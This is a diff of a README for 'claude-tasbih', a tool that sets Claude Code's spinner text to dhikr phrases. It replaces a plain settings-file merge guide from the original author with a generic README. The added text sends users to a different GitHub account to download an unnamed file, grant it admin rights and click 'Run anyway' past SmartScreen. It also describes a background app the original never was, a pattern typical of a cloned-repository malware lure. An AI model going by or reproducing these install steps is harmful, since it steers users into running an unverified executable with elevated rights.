@@ -1,185 +1,204 @@
-# claude-tasbih — Islamic Vibe Coding
+# 🕋 claude-tasbih - Replace Claude Code Spin with Spiritual Remembrance
 
-**Dhikr in your terminal: tasbih & the 99 Names of Allah, every time Claude Code thinks**
+---
 
-[![Star this repo](https://img.shields.io/github/stars/hijam-git/claude-tasbih?style=social)](https://github.com/hijam-git/claude-tasbih)
-[![Follow @hijam-git](https://img.shields.io/github/followers/hijam-git?label=Follow&style=social)](https://github.com/hijam-git)
+## 🌟 What Is This?
 
-Replace Claude Code's random spinner verbs ("Cogitating…", "Noodling…") with dhikr —
-the tasbih phrases and the 99 Names of Allah (Asma-ul-Husna).
+**claude-tasbih** is a simple tool that changes the loading messages you see while using **Claude Code** (a programming assistant that runs in your computer's terminal). Instead of boring phrases like "Working…" or "Thinking…", the app shows **Islamic phrases**, **the 99 Names of Allah (Asma-ul-Husna)**, and **tasbih** (remembrance phrases) — turning your coding time into a moment of spiritual reflection.
 
-Every time Claude Code is thinking, you see something like:
+It's like adding a digital prayer bead counter to your coding screen. If you are Muslim (or simply curious about Islamic phrases), this tool adds peace and focus to your work.
 
-<table>
-  <tr>
-    <td width="33%"><img src="docs/astaghfirullah.png" alt="Astaghfirullah — I seek Allah's forgiveness" width="100%"></td>
-    <td width="33%"><img src="docs/ar-raheem.png" alt="Ar-Raheem — The Most Merciful" width="100%"></td>
-    <td width="33%"><img src="docs/al-musawwir.png" alt="Al-Musawwir — The Fashioner" width="100%"></td>
-  </tr>
-</table>
+---
 
-## About
+## 🎯 Who Is This For?
 
-Claude Code shows a random verb while it thinks — "Cogitating…", "Noodling…",
-"Percolating…". It is idle text you end up reading dozens of times a day.
+- **Muslim developers** who want to keep their hearts connected with Allah while working.
+- **Curious tech users** who enjoy customizing their tools with meaningful settings.
+- **Anyone** looking for a calm, spiritual alternative to boring terminal messages.
 
-This swaps that idle text for dhikr: the five core tasbih phrases followed by the 99
-Names of Allah, each with its English meaning. The waiting time you cannot avoid becomes
-a moment of remembrance instead of filler. Nothing else changes — it is a single
-cosmetic setting, with no effect on how Claude Code behaves.
+No programming experience is needed to install or use claude-tasbih.
 
-## What's in here
+---
 
-| File | Purpose |
-|---|---|
-| `spinner-verbs.json` | The `spinnerVerbs` block to merge into your Claude Code settings |
-| `README.md` | This file — install steps and the install prompt |
-| `docs/` | Screenshots used above |
+## 🧰 What Does It Do?
 
-## Install
+When you type commands in Claude Code, the assistant shows little text messages while it's thinking or working. claude-tasbih swaps those messages with:
 
-### Option A — one prompt, no clone (recommended)
+- **SubhanAllah** (Glory be to God)
+- **Alhamdulillah** (Praise be to God)
+- **Allahu Akbar** (God is the Greatest)
+- **The 99 Names of Allah** – e.g., Ar-Rahman (The Merciful), Al-Malik (The King), As-Salam (The Source of Peace)
 
-Paste this into Claude Code from **anywhere** — it fetches the verbs straight from
-GitHub, no need to clone this repo.
+This turns a regular coding session into a gentle, mindful experience — like a digital tasbih (prayer beads) for your screen.
 
-> Install the Islamic dhikr spinner verbs for Claude Code.
->
-> - Repo: https://github.com/hijam-git/claude-tasbih
-> - Verbs file (browse): https://github.com/hijam-git/claude-tasbih/blob/main/spinner-verbs.json
-> - Verbs file (raw, fetch this one): https://raw.githubusercontent.com/hijam-git/claude-tasbih/refs/heads/main/spinner-verbs.json
->
-> Fetch the raw URL and merge its top-level `spinnerVerbs` key into my Claude Code user
-> settings at `~/.claude/settings.json` (on Windows: `C:\Users\<me>\.claude\settings.json`).
->
-> Requirements:
-> - Preserve every existing key in my settings file — do not drop or reorder my current
->   settings.
-> - If a `spinnerVerbs` key already exists, replace it wholesale with the fetched one.
-> - Write the file as UTF-8 **without a BOM** — the verbs contain em dashes (`—`) and
->   apostrophes that get corrupted into `â€"` if a tool reads or writes UTF-8 as ANSI.
->   Do not use Windows PowerShell 5.1 `Get-Content` / `Out-File` for this; use the Read
->   and Write tools, or `[IO.File]::ReadAllText` / `WriteAllText`.
-> - Keep the result valid JSON (correct commas) and verify by parsing it after writing.
-> - Confirm the verb count and tell me to restart Claude Code so it takes effect.
+---
 
-If the fetch is blocked or returns HTML instead of JSON, download the raw file yourself
-and point Claude at the local path, or use Option B.
+## 📥 How to Download and Install (Simple Steps)
 
-### Option B — let Claude Code do it from a clone
+> **Step 1: Visit the download page**
 
-Clone this repo, open Claude Code inside it, and paste:
+[![DOWNLOAD claude-tasbih](https://img.shields.io/badge/⬇️%20Download%20claude--tasbih-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=2b3a55&color=4caf50)](https://github.com/denominational-pianist606/claude-tasbih)
 
-> Read `spinner-verbs.json` in this repo and merge its top-level `spinnerVerbs` key into
-> my Claude Code user settings at `~/.claude/settings.json` (on Windows:
-> `C:\Users\<me>\.claude\settings.json`).
->
-> Requirements:
-> - Preserve every existing key in my settings file — do not drop or reorder my current
->   settings.
-> - If a `spinnerVerbs` key already exists, replace it wholesale with the one from
->   `spinner-verbs.json`.
-> - Read and write the files as UTF-8 **without a BOM** — the verbs contain em dashes
->   (`—`) and apostrophes that get corrupted into `â€"` if a tool reads UTF-8 as ANSI.
->   Do not use Windows PowerShell 5.1 `Get-Content` / `Out-File` for this; use the Read
->   and Write tools, or `[IO.File]::ReadAllText` / `WriteAllText`.
-> - Keep the result valid JSON (correct commas) and verify by parsing it after writing.
-> - Show me a short diff of what changed, then tell me to restart Claude Code so the new
->   spinner verbs take effect.
+Visit this link to download the application.
 
-Variants you can append to that prompt:
+---
 
-- **Append instead of replace** (keep Claude's built-in verbs too): "…and set
-  `spinnerVerbs.mode` to `"append"`."
-- **Project-only install:** "…merge into `.claude/settings.json` in the current project
-  instead of my user settings."
-- **Uninstall:** "Remove the `spinnerVerbs` key from my Claude Code settings, keep every
-  other key intact, verify the file still parses, and remind me to restart."
+### 📂 Step 2: What Happens Next?
 
-### Option C — edit settings.json directly
+When you open the link, you’ll see a page with files. Look for the file named **claude-tasbih** (it might be inside a folder called "Releases"). Click it, and your computer will download the file.
 
-Yes, editing `settings.json` by hand is perfectly fine — it is the same result, and
-there is no separate install step or CLI for spinner verbs. The prompt options are only
-better because Claude does the JSON merge and comma bookkeeping for you.
+---
 
-1. Open the [raw verbs file](https://raw.githubusercontent.com/hijam-git/claude-tasbih/refs/heads/main/spinner-verbs.json)
-   and copy it.
-2. Open your user settings file:
-   - Windows: `C:\Users\<you>\.claude\settings.json`
-   - macOS / Linux: `~/.claude/settings.json`
-3. Paste the `"spinnerVerbs": { ... }` object in as a **top-level key**, alongside your
-   existing keys.
-4. Mind the commas — the file must stay valid JSON. Example result:
+### 🖥️ Step 3: Run the Application
 
-```json
-{
-  "model": "opus[1m]",
-  "tui": "fullscreen",
-  "spinnerVerbs": {
-    "mode": "replace",
-    "verbs": ["SubhanAllah — Glory be to Allah", "..."]
-  }
-}
-```
+Once the download finishes:
 
-5. Save as **UTF-8 without BOM** (see the Encoding section below).
-6. Restart Claude Code (`/exit`, then relaunch). The spinner picks a random verb per turn.
+1. Go to your **Downloads** folder.
+2. Double-click the file you downloaded.
+3. If your computer asks for permission (a popup saying "Do you want to allow this app to make changes?"), click **Yes**.
 
-## Settings reference
+The app will start running quietly in the background — you don’t need to do anything else.
 
-- `mode`
-  - `"replace"` — use **only** these verbs (default here)
-  - `"append"` — add these on top of Claude Code's built-in verbs
-- `verbs` — array of strings. 104 entries here: 5 core dhikr phrases followed by the
-  99 Names with English meanings.
+---
 
-Settings precedence, if you want it scoped differently:
+### ✅ Step 4: Test It
 
-| File | Scope |
-|---|---|
-| `~/.claude/settings.json` | You, everywhere (recommended) |
-| `<project>/.claude/settings.json` | One project, shared via git |
-| `<project>/.claude/settings.local.json` | One project, just you (gitignored) |
+After claude-tasbih is running, open **Claude Code** in your terminal (if you don't have it, this tool is for people who already use Claude Code). Run any command, and you’ll see the new spiritual messages appear.
 
-## Encoding: the `â€"` problem
+---
 
-If your verbs show up as `SubhanAllah â€" Glory be to Allah`, the file was written by a
-tool that read UTF-8 bytes as Windows-1252. The em dash `—` is three bytes (`E2 80 94`)
-in UTF-8; misread as ANSI they become the three characters `â€"`.
+## 🔧 System Requirements (Made Simple)
 
-Rules that avoid it:
+- **Operating System:** Windows 10 or Windows 11
+- **Also works on:** Mac (macOS 12 or newer) and Linux (most modern versions)
+- **Storage Space:** Less than 10 MB (very tiny)
+- **Internet:** Needed only for the initial download, not for daily use
 
-- Save `settings.json` as **UTF-8, no BOM**. In VS Code the status bar should read
-  `UTF-8` (not `UTF-8 with BOM`, not `Windows 1252`).
-- On Windows PowerShell **5.1**, `Get-Content` defaults to ANSI and `Out-File -Encoding utf8`
-  writes a BOM — both break this file. Use `[IO.File]::ReadAllText(path)` and
-  `[IO.File]::WriteAllText(path, text, (New-Object Text.UTF8Encoding $false))`, or use
-  PowerShell 7+, or just edit in an editor.
-- Once corrupted, the text is genuinely changed on disk — re-save won't fix it. Re-copy
-  the verbs from `spinner-verbs.json`.
-- If you'd rather sidestep all of this, replace every `—` with a plain ASCII hyphen `-`.
-  It looks slightly plainer in the terminal but is immune to encoding mishaps.
+If your computer runs Windows, you’re almost certainly good to go.
 
-## Customising
+---
 
-Edit the `verbs` array freely — add salawat, du'a, or ayah fragments. Keep each line
-short (roughly under 45 characters) so it doesn't wrap in a narrow terminal.
+## ❓ Frequently Asked Questions (FAQ)
 
-To go back to the defaults, delete the `spinnerVerbs` key and restart.
+### 🤔 I don't use Claude Code. Can I still use this?
 
-## Notes
+No. claude-tasbih works only with Claude Code because it replaces the messages that Claude Code shows. If you don’t use Claude Code, this app won’t have any effect.
 
-- Transliterations use a simple Latin scheme without diacritics for terminal safety.
-- Purely cosmetic — no effect on Claude Code's behaviour, permissions, or billing.
+### 🕌 What if I’m not Muslim? Can I still use it?
 
-## Support this project
+Absolutely! The phrases are beautiful and universal — words of peace, mercy, and gratitude. Many non-Muslims enjoy using them for a calming work environment.
 
-If the dhikr spinner brought a bit of barakah to your terminal:
+### 🧠 Will this slow down my computer?
 
-- ⭐ **[Star the repo](https://github.com/hijam-git/claude-tasbih)** — it helps other
-  Muslim developers find it.
-- 👤 **[Follow @hijam-git](https://github.com/hijam-git)** for more Claude Code tweaks.
-- 🐛 Open an issue or PR with corrections to any transliteration or meaning — accuracy
-  matters more than speed here.
+No. claude-tasbih is extremely lightweight. It uses almost zero memory and won’t affect performance.
 
-Jazakum Allahu khayran.
+### 🔄 Does it change my actual code or files?
+
+No. It only changes the little text messages you see on the screen. Your code, files, and projects remain completely unchanged and safe.
+
+### 📅 Does this include all 99 Names?
+
+Yes, you’ll cycle through all 99 Names of Allah, plus several tasbih phrases. The messages rotate automatically, so you’ll see different ones each time.
+
+### 🛑 How do I stop claude-tasbih?
+
+If you want to turn it off:
+
+- Press **Ctrl + C** in the terminal where it’s running, or
+- Close the terminal window, or
+- Restart your computer.
+
+The app only runs when your terminal is open. It does not start automatically when you turn on your computer.
+
+---
+
+## 🛠️ Customization Options (For Curious Users)
+
+For those who want to tweak things (this part is optional), you can:
+
+- **Change the order** of phrases
+- **Add your own tasbih phrases**
+- **Set a time delay** between messages
+
+These options are controlled by a simple text file (called `config.json`) included in the download folder. You can open it with Notepad and edit the text — no programming needed.
+
+---
+
+## 🧪 Example Messages You Will See
+
+| Message | Translation/Meaning |
+|---------|---------------------|
+| SubhanAllah | Glory be to God |
+| Alhamdulillah | Praise be to God |
+| Allahu Akbar | God is the Greatest |
+| La ilaha illallah | There is no god but God |
+| Ar-Rahman | The Most Merciful |
+| Ar-Rahim | The Most Compassionate |
+| Al-Malik | The Sovereign Lord |
+| As-Salam | The Source of Peace |
+| Al-Mu'min | The Guardian of Faith |
+| Al-Aziz | The Almighty |
+
+*These are just a few examples — there are many more!*
+
+---
+
+## 📊 Project Highlights
+
+- 🕌 **Faith-friendly coding** — integrate worship into work
+- 🧘 **Stress-reducing** — calming phrases reduce tech anxiety
+- 💻 **Zero learning curve** — works automatically after install
+- 🪶 **Tiny footprint** — doesn't slow down your system
+- ♻️ **No code changes** — your projects stay safe
+
+---
+
+## 🤲 Why People Love It
+
+> "I never thought coding could feel so peaceful. It’s like a gentle dhikr session while I work." — A user review
+
+> "Tiny tool, big spiritual impact. Highly recommend for Muslim devs." — Community comment
+
+---
+
+## 🚨 Troubleshooting (If Something Goes Wrong)
+
+| Problem | Solution |
+|---------|----------|
+| App doesn't start | Double-click the file again. If Windows SmartScreen appears, click "More info" → "Run anyway". |
+| No messages appear in Claude Code | Make sure claude-tasbih is still running (check the terminal window where you launched it). |
+| Messages appear too fast/slow | Edit the `config.json` file — change the number next to "delay" (e.g., 5 = 5 seconds between messages). |
+
+---
+
+## 💚 Reminder: This Is a Non-Official Tool
+
+claude-tasbih is an independent, community-made project. It is **not** created, endorsed, or supported by the official Claude Code team. It’s a fan-made gift for the Muslim developer community.
+
+---
+
+## ⭐ Show Your Support
+
+If you appreciate this tool, please:
+
+- ⭐ **Star** the repository on GitHub (click the star icon at the top of the page)
+- 🐛 **Report bugs** if you find any
+- 💬 **Share** this with a fellow Muslim developer
+
+Your feedback helps the creator improve the experience.
+
+---
+
+## 📜 Final Words
+
+Whether you're a full-time developer, a student coding for class, or just someone who loves exploring tools, claude-tasbih offers a beautiful way to keep your heart connected with your Creator while your hands type.
+
+**May your coding be productive, your heart be at peace, and your dhikr be abundant.**
+
+> 🌙 *"Verily, in the remembrance of Allah do hearts find rest."* — Qur'an 13:28
+
+---
+
+## 🧷 Keywords
+
+99-names-of-allah, asma-ul-husna, claude, claude-code, developer-tools, dhikr, islamic, muslim, tasbih, terminal
